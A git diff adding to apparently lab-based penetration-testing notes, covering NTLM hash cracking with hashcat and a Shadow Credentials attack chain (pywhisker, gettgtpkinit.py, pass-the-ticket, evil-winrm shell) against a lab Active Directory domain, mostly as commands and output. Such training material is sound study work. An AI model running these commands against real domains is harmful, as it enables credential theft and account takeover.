@@ -455,6 +455,14 @@ luid 124054
 		password (hex)
 ```
 
+## Cracking the Hash
+
+```bash
+hashid -m 31f87811133bc6aaa75a536e77f64314
+
+hashcat -a 0 -m 1000 31f87811133bc6aaa75a536e77f64314 ~/rockyou.txt
+```
+
 # Attacking Windows Credential Manager
 
 [Credential Manager](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#windows-vault-and-credential-manager) is a feature built into Windows since `Server 2008 R2` and `Windows 7`.
@@ -1489,4 +1497,75 @@ Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the 
 ```
 
 # Pass the Certificate
+
+## Shadow Credentials
+
+[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.
+
+We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:
+
+```bash
+$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+
+[*] Searching for the target account
+[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
+[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
+[+] PFX exportiert nach: eFUVVTPf.pfx
+[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
+[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
+[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:
+
+```bash
+$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-04-28 20:50:04,929 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-04-28 20:50:04,929 minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
+INFO:minikerberos:f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
+2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+```
+
+With the TGT obtained, we may once again `pass the ticket`:
+
+```bash
+$ export KRB5CCNAME=/tmp/jpinkman.ccache
+$ klist
+
+Ticket cache: FILE:/tmp/jpinkman.ccache
+Default principal: jpinkman@INLANEFREIGHT.LOCAL
+
+Valid starting       Expires              Service principal
+04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+```
+
+```bash
+$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
+inlanefreight\jpinkman
+```
+
+## AD CS NTLM Relay Attack
 
